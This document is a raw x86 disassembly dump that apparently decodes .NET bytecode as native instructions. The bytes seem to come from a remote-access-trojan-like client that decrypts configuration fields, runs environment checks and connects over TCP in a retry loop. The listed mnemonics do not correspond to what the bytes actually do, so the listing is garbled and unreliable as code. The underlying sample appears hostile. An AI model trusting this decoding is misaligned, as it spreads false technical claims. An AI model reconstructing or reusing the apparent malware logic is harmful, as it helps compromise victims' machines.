  4025eb:	00 00                	add    %al,(%eax)
  4025ed:	02 20                	add    (%eax),%ah
  4025ef:	c3                   	ret
  4025f0:	00 00                	add    %al,(%eax)
  4025f2:	00 6f ee             	add    %ch,-0x12(%edi)
  4025f5:	00 00                	add    %al,(%eax)
  4025f7:	0a 2a                	or     (%edx),%ch
  4025f9:	02 20                	add    (%eax),%ah
  4025fb:	c2 00 00             	ret    $0x0
  4025fe:	00 6f ee             	add    %ch,-0x12(%edi)
  402601:	00 00                	add    %al,(%eax)
  402603:	0a 2a                	or     (%edx),%ch
  402605:	00 00                	add    %al,(%eax)
  402607:	00 1b                	add    %bl,(%ebx)
  402609:	30 02                	xor    %al,(%edx)
  40260b:	00 c5                	add    %al,%ch
  40260d:	00 00                	add    %al,(%eax)
  40260f:	00 01                	add    %al,(%ecx)
  402611:	00 00                	add    %al,(%eax)
  402613:	11 16                	adc    %edx,(%esi)
  402615:	0a 38                	or     (%eax),%bh
  402617:	0e                   	push   %cs
  402618:	00 00                	add    %al,(%eax)
  40261a:	00 20                	add    %ah,(%eax)
  40261c:	e8 03 00 00 28       	call   0x28402624
  402621:	14 00                	adc    $0x0,%al
  402623:	00 0a                	add    %cl,(%edx)
  402625:	06                   	push   %es
  402626:	17                   	pop    %ss
  402627:	58                   	pop    %eax
  402628:	0a 06                	or     (%esi),%al
  40262a:	7e 11                	jle    0x40263d
  40262c:	00 00                	add    %al,(%eax)
  40262e:	04 28                	add    $0x28,%al
  402630:	15 00 00 0a 32       	adc    $0x320a0000,%eax
  402635:	e5 28                	in     $0x28,%eax
  402637:	03 00                	add    (%eax),%eax
  402639:	00 06                	add    %al,(%esi)
  40263b:	3a 06                	cmp    (%esi),%al
  40263d:	00 00                	add    %al,(%eax)
  40263f:	00 16                	add    %dl,(%esi)
  402641:	28 16                	sub    %dl,(%esi)
  402643:	00 00                	add    %al,(%eax)
  402645:	0a 00                	or     (%eax),%al
  402647:	28 36                	sub    %dh,(%esi)
  402649:	00 00                	add    %al,(%eax)
  40264b:	06                   	push   %es
  40264c:	3a 06                	cmp    (%esi),%al
  40264e:	00 00                	add    %al,(%eax)
  402650:	00 16                	add    %dl,(%esi)
  402652:	28 16                	sub    %dl,(%esi)
  402654:	00 00                	add    %al,(%eax)
  402656:	0a 7e 0c             	or     0xc(%esi),%bh
  402659:	00 00                	add    %al,(%eax)
  40265b:	04 28                	add    $0x28,%al
  40265d:	17                   	pop    %ss
  40265e:	00 00                	add    %al,(%eax)
  402660:	0a 39                	or     (%ecx),%bh
  402662:	05 00 00 00 28       	add    $0x28000000,%eax
  402667:	26 00 00             	add    %al,%es:(%eax)
  40266a:	06                   	push   %es
  40266b:	7e 04                	jle    0x402671
  40266d:	00 00                	add    %al,(%eax)
  40266f:	04 28                	add    $0x28,%al
  402671:	17                   	pop    %ss
  402672:	00 00                	add    %al,(%eax)
  402674:	0a 39                	or     (%ecx),%bh
  402676:	05 00 00 00 28       	add    $0x28000000,%eax
  40267b:	24 00                	and    $0x0,%al
  40267d:	00 06                	add    %al,(%esi)
  40267f:	7e 0f                	jle    0x402690
  402681:	00 00                	add    %al,(%eax)
  402683:	04 28                	add    $0x28,%al
  402685:	17                   	pop    %ss
  402686:	00 00                	add    %al,(%eax)
  402688:	0a 39                	or     (%ecx),%bh
  40268a:	0f 00 00             	sldt   (%eax)
  40268d:	00 28                	add    %ch,(%eax)
  40268f:	30 00                	xor    %al,(%eax)
  402691:	00 06                	add    %al,(%esi)
  402693:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  402699:	3f                   	aas
  40269a:	00 00                	add    %al,(%eax)
  40269c:	06                   	push   %es
  40269d:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4026a0:	00 06                	add    %al,(%esi)
  4026a2:	dd 06                	fldl   (%esi)
  4026a4:	00 00                	add    %al,(%eax)
  4026a6:	00 26                	add    %ah,(%esi)
  4026a8:	dd 00                	fldl   (%eax)
  4026aa:	00 00                	add    %al,(%eax)
  4026ac:	00 00                	add    %al,(%eax)
  4026ae:	28 12                	sub    %dl,(%edx)
  4026b0:	00 00                	add    %al,(%eax)
  4026b2:	06                   	push   %es
  4026b3:	3a 0a                	cmp    (%edx),%cl
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	00 28                	add    %ch,(%eax)
  4026b9:	1e                   	push   %ds
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	06                   	push   %es
  4026bd:	28 1b                	sub    %bl,(%ebx)
  4026bf:	00 00                	add    %al,(%eax)
  4026c1:	06                   	push   %es
  4026c2:	dd 06                	fldl   (%esi)
  4026c4:	00 00                	add    %al,(%eax)
  4026c6:	00 26                	add    %ah,(%esi)
  4026c8:	dd 00                	fldl   (%eax)
  4026ca:	00 00                	add    %al,(%eax)
  4026cc:	00 20                	add    %ah,(%eax)
  4026ce:	88 13                	mov    %dl,(%ebx)
  4026d0:	00 00                	add    %al,(%eax)
  4026d2:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4026d5:	00 0a                	add    %cl,(%edx)
  4026d7:	2b d4                	sub    %esp,%edx
  4026d9:	00 00                	add    %al,(%eax)
  4026db:	00 01                	add    %al,(%ecx)
  4026dd:	1c 00                	sbb    $0x0,%al
  4026df:	00 00                	add    %al,(%eax)
  4026e1:	00 33                	add    %dh,(%ebx)
  4026e3:	00 60 93             	add    %ah,-0x6d(%eax)
  4026e6:	00 06                	add    %al,(%esi)
  4026e8:	01 00                	add    %eax,(%eax)
  4026ea:	00 01                	add    %al,(%ecx)
  4026ec:	00 00                	add    %al,(%eax)
  4026ee:	9a 00 19 b3 00 06 01 	lcall  $0x106,$0xb31900
  4026f5:	00 00                	add    %al,(%eax)
  4026f7:	01 1b                	add    %ebx,(%ebx)
  4026f9:	30 02                	xor    %al,(%edx)
  4026fb:	00 2d 01 00 00 02    	add    %ch,0x2000001
  402701:	00 00                	add    %al,(%eax)
  402703:	11 28                	adc    %ebp,(%eax)
  402705:	19 00                	sbb    %eax,(%eax)
  402707:	00 0a                	add    %cl,(%edx)
  402709:	7e 07                	jle    0x402712
  40270b:	00 00                	add    %al,(%eax)
  40270d:	04 28                	add    $0x28,%al
  40270f:	1a 00                	sbb    (%eax),%al
  402711:	00 0a                	add    %cl,(%edx)
  402713:	6f                   	outsl  %ds:(%esi),(%dx)
  402714:	1b 00                	sbb    (%eax),%eax
  402716:	00 0a                	add    %cl,(%edx)
  402718:	80 07 00             	addb   $0x0,(%edi)
  40271b:	00 04 7e             	add    %al,(%esi,%edi,2)
  40271e:	07                   	pop    %es
  40271f:	00 00                	add    %al,(%eax)
  402721:	04 73                	add    $0x73,%al
  402723:	4b                   	dec    %ebx
  402724:	00 00                	add    %al,(%eax)
  402726:	06                   	push   %es
  402727:	80 0d 00 00 04 7e 0d 	orb    $0xd,0x7e040000
  40272e:	00 00                	add    %al,(%eax)
  402730:	04 7e                	add    $0x7e,%al
  402732:	01 00                	add    %eax,(%eax)
  402734:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402737:	4e                   	dec    %esi
  402738:	00 00                	add    %al,(%eax)
  40273a:	06                   	push   %es
  40273b:	80 01 00             	addb   $0x0,(%ecx)
  40273e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402741:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402746:	02 00                	add    (%eax),%al
  402748:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40274b:	4e                   	dec    %esi
  40274c:	00 00                	add    %al,(%eax)
  40274e:	06                   	push   %es
  40274f:	80 02 00             	addb   $0x0,(%edx)
  402752:	00 04 7e             	add    %al,(%esi,%edi,2)
  402755:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40275a:	03 00                	add    (%eax),%eax
  40275c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40275f:	4e                   	dec    %esi
  402760:	00 00                	add    %al,(%eax)
  402762:	06                   	push   %es
  402763:	80 03 00             	addb   $0x0,(%ebx)
  402766:	00 04 7e             	add    %al,(%esi,%edi,2)
  402769:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40276e:	04 00                	add    $0x0,%al
  402770:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402773:	4e                   	dec    %esi
  402774:	00 00                	add    %al,(%eax)
  402776:	06                   	push   %es
  402777:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  40277b:	04 7e                	add    $0x7e,%al
  40277d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402782:	08 00                	or     %al,(%eax)
  402784:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402787:	4e                   	dec    %esi
  402788:	00 00                	add    %al,(%eax)
  40278a:	06                   	push   %es
  40278b:	80 08 00             	orb    $0x0,(%eax)
  40278e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402791:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402796:	0e                   	push   %cs
  402797:	00 00                	add    %al,(%eax)
  402799:	04 6f                	add    $0x6f,%al
  40279b:	4e                   	dec    %esi
  40279c:	00 00                	add    %al,(%eax)
  40279e:	06                   	push   %es
  40279f:	80 0e 00             	orb    $0x0,(%esi)
  4027a2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027a5:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027aa:	0c 00                	or     $0x0,%al
  4027ac:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027af:	4e                   	dec    %esi
  4027b0:	00 00                	add    %al,(%eax)
  4027b2:	06                   	push   %es
  4027b3:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  4027b7:	04 7e                	add    $0x7e,%al
  4027b9:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027be:	0f 00 00             	sldt   (%eax)
  4027c1:	04 6f                	add    $0x6f,%al
  4027c3:	4e                   	dec    %esi
  4027c4:	00 00                	add    %al,(%eax)
  4027c6:	06                   	push   %es
  4027c7:	80 0f 00             	orb    $0x0,(%edi)
  4027ca:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027cd:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027d2:	12 00                	adc    (%eax),%al
  4027d4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027d7:	4e                   	dec    %esi
  4027d8:	00 00                	add    %al,(%eax)
  4027da:	06                   	push   %es
  4027db:	80 12 00             	adcb   $0x0,(%edx)
  4027de:	00 04 28             	add    %al,(%eax,%ebp,1)
  4027e1:	2d 00 00 06 80       	sub    $0x80060000,%eax
  4027e6:	10 00                	adc    %al,(%eax)
  4027e8:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027eb:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027f0:	0a 00                	or     (%eax),%al
  4027f2:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027f5:	4e                   	dec    %esi
  4027f6:	00 00                	add    %al,(%eax)
  4027f8:	06                   	push   %es
  4027f9:	80 0a 00             	orb    $0x0,(%edx)
  4027fc:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027ff:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402804:	09 00                	or     %eax,(%eax)
  402806:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402809:	4e                   	dec    %esi
  40280a:	00 00                	add    %al,(%eax)
  40280c:	06                   	push   %es
  40280d:	28 1a                	sub    %bl,(%edx)
  40280f:	00 00                	add    %al,(%eax)
  402811:	0a 73 1c             	or     0x1c(%ebx),%dh
  402814:	00 00                	add    %al,(%eax)
  402816:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  40281c:	28 04 00             	sub    %al,(%eax,%eax,1)
  40281f:	00 06                	add    %al,(%esi)
  402821:	0a dd                	or     %ch,%bl
  402823:	08 00                	or     %al,(%eax)
  402825:	00 00                	add    %al,(%eax)
  402827:	26 16                	es push %ss
  402829:	0a dd                	or     %ch,%bl
  40282b:	00 00                	add    %al,(%eax)
  40282d:	00 00                	add    %al,(%eax)
  40282f:	06                   	push   %es
  402830:	2a 00                	sub    (%eax),%al
  402832:	00 00                	add    %al,(%eax)
  402834:	41                   	inc    %ecx
  402835:	1c 00                	sbb    $0x0,%al
	...
  40283f:	00 23                	add    %ah,(%ebx)
  402841:	01 00                	add    %eax,(%eax)
  402843:	00 23                	add    %ah,(%ebx)
  402845:	01 00                	add    %eax,(%eax)
  402847:	00 08                	add    %cl,(%eax)
  402849:	00 00                	add    %al,(%eax)
  40284b:	00 01                	add    %al,(%ecx)
  40284d:	00 00                	add    %al,(%eax)
  40284f:	01 1b                	add    %ebx,(%ebx)
  402851:	30 04 00             	xor    %al,(%eax,%eax,1)
  402854:	51                   	push   %ecx
  402855:	00 00                	add    %al,(%eax)
  402857:	00 02                	add    %al,(%edx)
  402859:	00 00                	add    %al,(%eax)
  40285b:	11 7e 0b             	adc    %edi,0xb(%esi)
  40285e:	00 00                	add    %al,(%eax)
  402860:	04 6f                	add    $0x6f,%al
  402862:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  402867:	1e                   	push   %ds
  402868:	00 00                	add    %al,(%eax)
  40286a:	0a 74 2f 00          	or     0x0(%edi,%ebp,1),%dh
  40286e:	00 01                	add    %al,(%ecx)
  402870:	28 19                	sub    %bl,(%ecx)
  402872:	00 00                	add    %al,(%eax)
  402874:	0a 7e 07             	or     0x7(%esi),%bh
  402877:	00 00                	add    %al,(%eax)
  402879:	04 6f                	add    $0x6f,%al
  40287b:	1f                   	pop    %ds
  40287c:	00 00                	add    %al,(%eax)
  40287e:	0a 28                	or     (%eax),%ch
  402880:	53                   	push   %ebx
  402881:	00 00                	add    %al,(%eax)
  402883:	06                   	push   %es
  402884:	72 01                	jb     0x402887
  402886:	00 00                	add    %al,(%eax)
  402888:	70 28                	jo     0x4028b2
  40288a:	20 00                	and    %al,(%eax)
  40288c:	00 0a                	add    %cl,(%edx)
  40288e:	7e 0a                	jle    0x40289a
  402890:	00 00                	add    %al,(%eax)
  402892:	04 28                	add    $0x28,%al
  402894:	1a 00                	sbb    (%eax),%al
  402896:	00 0a                	add    %cl,(%edx)
  402898:	6f                   	outsl  %ds:(%esi),(%dx)
  402899:	21 00                	and    %eax,(%eax)
  40289b:	00 0a                	add    %cl,(%edx)
  40289d:	0a dd                	or     %ch,%bl
  40289f:	08 00                	or     %al,(%eax)
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	26 16                	es push %ss
  4028a5:	0a dd                	or     %ch,%bl
  4028a7:	00 00                	add    %al,(%eax)
  4028a9:	00 00                	add    %al,(%eax)
  4028ab:	06                   	push   %es
  4028ac:	2a 00                	sub    (%eax),%al
  4028ae:	00 00                	add    %al,(%eax)
  4028b0:	01 10                	add    %edx,(%eax)
  4028b2:	00 00                	add    %al,(%eax)
  4028b4:	00 00                	add    %al,(%eax)
  4028b6:	00 00                	add    %al,(%eax)
  4028b8:	47                   	inc    %edi
  4028b9:	47                   	inc    %edi
  4028ba:	00 08                	add    %cl,(%eax)
  4028bc:	31 00                	xor    %eax,(%eax)
  4028be:	00 01                	add    %al,(%ecx)
  4028c0:	13 30                	adc    (%eax),%esi
  4028c2:	01 00                	add    %eax,(%eax)
  4028c4:	9d                   	popf
  4028c5:	00 00                	add    %al,(%eax)
  4028c7:	00 00                	add    %al,(%eax)
  4028c9:	00 00                	add    %al,(%eax)
  4028cb:	00 72 0f             	add    %dh,0xf(%edx)
  4028ce:	00 00                	add    %al,(%eax)
  4028d0:	70 80                	jo     0x402852
  4028d2:	01 00                	add    %eax,(%eax)
  4028d4:	00 04 72             	add    %al,(%edx,%esi,2)
  4028d7:	ea 00 00 70 80 02 00 	ljmp   $0x2,$0x80700000
  4028de:	00 04 72             	add    %al,(%edx,%esi,2)
  4028e1:	1d 02 00 70 80       	sbb    $0x80700002,%eax
  4028e6:	03 00                	add    (%eax),%eax
  4028e8:	00 04 72             	add    %al,(%edx,%esi,2)
  4028eb:	d0 02                	rolb   $1,(%edx)
  4028ed:	00 70 80             	add    %dh,-0x80(%eax)
  4028f0:	04 00                	add    $0x0,%al
  4028f2:	00 04 72             	add    %al,(%edx,%esi,2)
  4028f5:	83 03 00             	addl   $0x0,(%ebx)
  4028f8:	70 80                	jo     0x40287a
  4028fa:	05 00 00 04 72       	add    $0x72040000,%eax
  4028ff:	97                   	xchg   %eax,%edi
  402900:	03 00                	add    (%eax),%eax
  402902:	70 80                	jo     0x402884
  402904:	06                   	push   %es
  402905:	00 00                	add    %al,(%eax)
  402907:	04 72                	add    $0x72,%al
  402909:	99                   	cltd
  40290a:	03 00                	add    (%eax),%eax
  40290c:	70 80                	jo     0x40288e
  40290e:	07                   	pop    %es
  40290f:	00 00                	add    %al,(%eax)
  402911:	04 72                	add    $0x72,%al
  402913:	f3 03 00             	repz add (%eax),%eax
  402916:	70 80                	jo     0x402898
  402918:	08 00                	or     %al,(%eax)
  40291a:	00 04 72             	add    %al,(%edx,%esi,2)
  40291d:	0d 04 00 70 80       	or     $0x80700004,%eax
  402922:	09 00                	or     %eax,(%eax)
  402924:	00 04 72             	add    %al,(%edx,%esi,2)
  402927:	68 16 00 70 80       	push   $0x80700016
  40292c:	0a 00                	or     (%eax),%al
  40292e:	00 04 72             	add    %al,(%edx,%esi,2)
  402931:	1b 1e                	sbb    (%esi),%ebx
  402933:	00 70 80             	add    %dh,-0x80(%eax)
  402936:	0c 00                	or     $0x0,%al
  402938:	00 04 72             	add    %al,(%edx,%esi,2)
  40293b:	ce                   	into
  40293c:	1e                   	push   %ds
  40293d:	00 70 80             	add    %dh,-0x80(%eax)
  402940:	0e                   	push   %cs
  402941:	00 00                	add    %al,(%eax)
  402943:	04 72                	add    $0x72,%al
  402945:	81 1f 00 70 80 0f    	sbbl   $0xf807000,(%edi)
  40294b:	00 00                	add    %al,(%eax)
  40294d:	04 14                	add    $0x14,%al
  40294f:	80 10 00             	adcb   $0x0,(%eax)
  402952:	00 04 72             	add    %al,(%edx,%esi,2)
  402955:	34 20                	xor    $0x20,%al
  402957:	00 70 80             	add    %dh,-0x80(%eax)
  40295a:	11 00                	adc    %eax,(%eax)
  40295c:	00 04 72             	add    %al,(%edx,%esi,2)
  40295f:	38 20                	cmp    %ah,(%eax)
  402961:	00 70 80             	add    %dh,-0x80(%eax)
  402964:	12 00                	adc    (%eax),%al
  402966:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402969:	00 00                	add    %al,(%eax)
  40296b:	00 1b                	add    %bl,(%ebx)
  40296d:	30 07                	xor    %al,(%edi)
  40296f:	00 f1                	add    %dh,%cl
  402971:	02 00                	add    (%eax),%al
  402973:	00 03                	add    %al,(%ebx)
  402975:	00 00                	add    %al,(%eax)
  402977:	11 18                	adc    %ebx,(%eax)
  402979:	17                   	pop    %ss
  40297a:	1c 73                	sbb    $0x73,%al
  40297c:	22 00                	and    (%eax),%al
  40297e:	00 0a                	add    %cl,(%edx)
  402980:	25 20 00 c8 00       	and    $0xc80020,%eax
  402985:	00 6f 23             	add    %ch,0x23(%edi)
  402988:	00 00                	add    %al,(%eax)
  40298a:	0a 25 20 00 c8 00    	or     0xc80020,%ah
  402990:	00 6f 24             	add    %ch,0x24(%edi)
  402993:	00 00                	add    %al,(%eax)
  402995:	0a 28                	or     (%eax),%ch
  402997:	07                   	pop    %es
  402998:	00 00                	add    %al,(%eax)
  40299a:	06                   	push   %es
  40299b:	7e 0e                	jle    0x4029ab
  40299d:	00 00                	add    %al,(%eax)
  40299f:	04 72                	add    $0x72,%al
  4029a1:	eb 20                	jmp    0x4029c3
  4029a3:	00 70 28             	add    %dh,0x28(%eax)
  4029a6:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4029ab:	e3 00                	jecxz  0x4029ad
  4029ad:	00 00                	add    %al,(%eax)
  4029af:	7e 02                	jle    0x4029b3
  4029b1:	00 00                	add    %al,(%eax)
  4029b3:	04 17                	add    $0x17,%al
  4029b5:	8d 39                	lea    (%ecx),%edi
  4029b7:	00 00                	add    %al,(%eax)
  4029b9:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c0:	26 00 00             	add    %al,%es:(%eax)
  4029c3:	0a 73 27             	or     0x27(%ebx),%dh
  4029c6:	00 00                	add    %al,(%eax)
  4029c8:	0a 7e 02             	or     0x2(%esi),%bh
  4029cb:	00 00                	add    %al,(%eax)
  4029cd:	04 17                	add    $0x17,%al
  4029cf:	8d 39                	lea    (%ecx),%edi
  4029d1:	00 00                	add    %al,(%eax)
  4029d3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4029da:	26 00 00             	add    %al,%es:(%eax)
  4029dd:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  4029e3:	00 0a                	add    %cl,(%edx)
  4029e5:	9a 0a 7e 01 00 00 04 	lcall  $0x400,$0x17e0a
  4029ec:	17                   	pop    %ss
  4029ed:	8d 39                	lea    (%ecx),%edi
  4029ef:	00 00                	add    %al,(%eax)
  4029f1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029f8:	26 00 00             	add    %al,%es:(%eax)
  4029fb:	0a 73 27             	or     0x27(%ebx),%dh
  4029fe:	00 00                	add    %al,(%eax)
  402a00:	0a 7e 01             	or     0x1(%esi),%bh
  402a03:	00 00                	add    %al,(%eax)
  402a05:	04 17                	add    $0x17,%al
  402a07:	8d 39                	lea    (%ecx),%edi
  402a09:	00 00                	add    %al,(%eax)
  402a0b:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  402a11:	6f                   	outsl  %ds:(%esi),(%dx)
  402a12:	26 00 00             	add    %al,%es:(%eax)
  402a15:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  402a1b:	00 0a                	add    %cl,(%edx)
  402a1d:	9a 28 15 00 00 0a 0b 	lcall  $0xb0a,$0x1528
  402a24:	06                   	push   %es
  402a25:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402a28:	00 06                	add    %al,(%esi)
  402a2a:	39 52 00             	cmp    %edx,0x0(%edx)
  402a2d:	00 00                	add    %al,(%eax)
  402a2f:	06                   	push   %es
  402a30:	28 29                	sub    %ch,(%ecx)
  402a32:	00 00                	add    %al,(%eax)
  402a34:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402a37:	0d 38 39 00 00       	or     $0x3938,%eax
  402a3c:	00 08                	add    %cl,(%eax)
  402a3e:	09 a3 32 00 00 01    	or     %esp,0x1000032(%ebx)
  402a44:	13 04 28             	adc    (%eax,%ebp,1),%eax
  402a47:	06                   	push   %es
  402a48:	00 00                	add    %al,(%eax)
  402a4a:	06                   	push   %es
  402a4b:	11 04 07             	adc    %eax,(%edi,%eax,1)
  402a4e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a4f:	2a 00                	sub    (%eax),%al
  402a51:	00 0a                	add    %cl,(%edx)
  402a53:	28 06                	sub    %al,(%esi)
  402a55:	00 00                	add    %al,(%eax)
  402a57:	06                   	push   %es
  402a58:	6f                   	outsl  %ds:(%esi),(%dx)
  402a59:	2b 00                	sub    (%eax),%eax
  402a5b:	00 0a                	add    %cl,(%edx)
  402a5d:	39 05 00 00 00 dd    	cmp    %eax,0xdd000000
  402a63:	c3                   	ret
  402a64:	00 00                	add    %al,(%eax)
  402a66:	00 dd                	add    %bl,%ch
  402a68:	06                   	push   %es
  402a69:	00 00                	add    %al,(%eax)
  402a6b:	00 26                	add    %ah,(%esi)
  402a6d:	dd 00                	fldl   (%eax)
  402a6f:	00 00                	add    %al,(%eax)
  402a71:	00 09                	add    %cl,(%ecx)
  402a73:	17                   	pop    %ss
  402a74:	58                   	pop    %eax
  402a75:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402a7a:	32 c1                	xor    %cl,%al
  402a7c:	38 a9 00 00 00 28    	cmp    %ch,0x28000000(%ecx)
  402a82:	06                   	push   %es
  402a83:	00 00                	add    %al,(%eax)
  402a85:	06                   	push   %es
  402a86:	06                   	push   %es
  402a87:	07                   	pop    %es
  402a88:	6f                   	outsl  %ds:(%esi),(%dx)
  402a89:	2c 00                	sub    $0x0,%al
  402a8b:	00 0a                	add    %cl,(%edx)
  402a8d:	38 98 00 00 00 73    	cmp    %bl,0x73000000(%eax)
  402a93:	2d 00 00 0a 13       	sub    $0x130a0000,%eax
  402a98:	05 72 97 03 00       	add    $0x39772,%eax
  402a9d:	70 72                	jo     0x402b11
  402a9f:	97                   	xchg   %eax,%edi
  402aa0:	03 00                	add    (%eax),%eax
  402aa2:	70 73                	jo     0x402b17
  402aa4:	2e 00 00             	add    %al,%cs:(%eax)
  402aa7:	0a 13                	or     (%ebx),%dl
  402aa9:	06                   	push   %es
  402aaa:	11 05 11 06 6f 2f    	adc    %eax,0x2f6f0611
  402ab0:	00 00                	add    %al,(%eax)
  402ab2:	0a 11                	or     (%ecx),%dl
  402ab4:	05 7e 0e 00 00       	add    $0xe7e,%eax
  402ab9:	04 6f                	add    $0x6f,%al
  402abb:	30 00                	xor    %al,(%eax)
  402abd:	00 0a                	add    %cl,(%edx)
  402abf:	17                   	pop    %ss
  402ac0:	8d 38                	lea    (%eax),%edi
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	01 25 16 72 f5 20    	add    %esp,0x20f57216
  402aca:	00 70 a2             	add    %dh,-0x5e(%eax)
  402acd:	16                   	push   %ss
  402ace:	6f                   	outsl  %ds:(%esi),(%dx)
  402acf:	31 00                	xor    %eax,(%eax)
  402ad1:	00 0a                	add    %cl,(%edx)
  402ad3:	13 07                	adc    (%edi),%eax
  402ad5:	11 07                	adc    %eax,(%edi)
  402ad7:	16                   	push   %ss
  402ad8:	a3 38 00 00 01       	mov    %eax,0x1000038
  402add:	80 02 00             	addb   $0x0,(%edx)
  402ae0:	00 04 11             	add    %al,(%ecx,%edx,1)
  402ae3:	07                   	pop    %es
  402ae4:	73 27                	jae    0x402b0d
  402ae6:	00 00                	add    %al,(%eax)
  402ae8:	0a 17                	or     (%edi),%dl
  402aea:	11 07                	adc    %eax,(%edi)
  402aec:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402aef:	32 00                	xor    (%eax),%al
  402af1:	00 0a                	add    %cl,(%edx)
  402af3:	a3 38 00 00 01       	mov    %eax,0x1000038
  402af8:	80 01 00             	addb   $0x0,(%ecx)
  402afb:	00 04 28             	add    %al,(%eax,%ebp,1)
  402afe:	06                   	push   %es
  402aff:	00 00                	add    %al,(%eax)
  402b01:	06                   	push   %es
  402b02:	7e 02                	jle    0x402b06
  402b04:	00 00                	add    %al,(%eax)
  402b06:	04 7e                	add    $0x7e,%al
  402b08:	01 00                	add    %eax,(%eax)
  402b0a:	00 04 28             	add    %al,(%eax,%ebp,1)
  402b0d:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402b12:	2c 00                	sub    $0x0,%al
  402b14:	00 0a                	add    %cl,(%edx)
  402b16:	dd 0f                	fisttpll (%edi)
  402b18:	00 00                	add    %al,(%eax)
  402b1a:	00 11                	add    %dl,(%ecx)
  402b1c:	05 39 07 00 00       	add    $0x739,%eax
  402b21:	00 11                	add    %dl,(%ecx)
  402b23:	05 6f 33 00 00       	add    $0x336f,%eax
  402b28:	0a dc                	or     %ah,%bl
  402b2a:	28 06                	sub    %al,(%esi)
  402b2c:	00 00                	add    %al,(%eax)
  402b2e:	06                   	push   %es
  402b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b30:	2b 00                	sub    (%eax),%eax
  402b32:	00 0a                	add    %cl,(%edx)
  402b34:	39 18                	cmp    %ebx,(%eax)
  402b36:	01 00                	add    %eax,(%eax)
  402b38:	00 17                	add    %dl,(%edi)
  402b3a:	28 13                	sub    %dl,(%ebx)
  402b3c:	00 00                	add    %al,(%eax)
  402b3e:	06                   	push   %es
  402b3f:	28 06                	sub    %al,(%esi)
  402b41:	00 00                	add    %al,(%eax)
  402b43:	06                   	push   %es
  402b44:	17                   	pop    %ss
  402b45:	73 34                	jae    0x402b7b
  402b47:	00 00                	add    %al,(%eax)
  402b49:	0a 16                	or     (%esi),%dl
  402b4b:	14 fe                	adc    $0xfe,%al
  402b4d:	06                   	push   %es
  402b4e:	1d 00 00 06 73       	sbb    $0x73060000,%eax
  402b53:	35 00 00 0a 73       	xor    $0x730a0000,%eax
  402b58:	36 00 00             	add    %al,%ss:(%eax)
  402b5b:	0a 28                	or     (%eax),%ch
  402b5d:	09 00                	or     %eax,(%eax)
  402b5f:	00 06                	add    %al,(%esi)
  402b61:	28 08                	sub    %cl,(%eax)
  402b63:	00 00                	add    %al,(%eax)
  402b65:	06                   	push   %es
  402b66:	28 06                	sub    %al,(%esi)
  402b68:	00 00                	add    %al,(%eax)
  402b6a:	06                   	push   %es
  402b6b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b6c:	37                   	aaa
  402b6d:	00 00                	add    %al,(%eax)
  402b6f:	0a 6f 38             	or     0x38(%edi),%ch
  402b72:	00 00                	add    %al,(%eax)
  402b74:	0a 17                	or     (%edi),%dl
  402b76:	8d 39                	lea    (%ecx),%edi
  402b78:	00 00                	add    %al,(%eax)
  402b7a:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402b80:	6f                   	outsl  %ds:(%esi),(%dx)
  402b81:	26 00 00             	add    %al,%es:(%eax)
  402b84:	0a 16                	or     (%esi),%dl
  402b86:	a3 38 00 00 01       	mov    %eax,0x1000038
  402b8b:	14 20                	adc    $0x20,%al
  402b8d:	c0 00 00             	rolb   $0x0,(%eax)
  402b90:	00 16                	add    %dl,(%esi)
  402b92:	6f                   	outsl  %ds:(%esi),(%dx)
  402b93:	39 00                	cmp    %eax,(%eax)
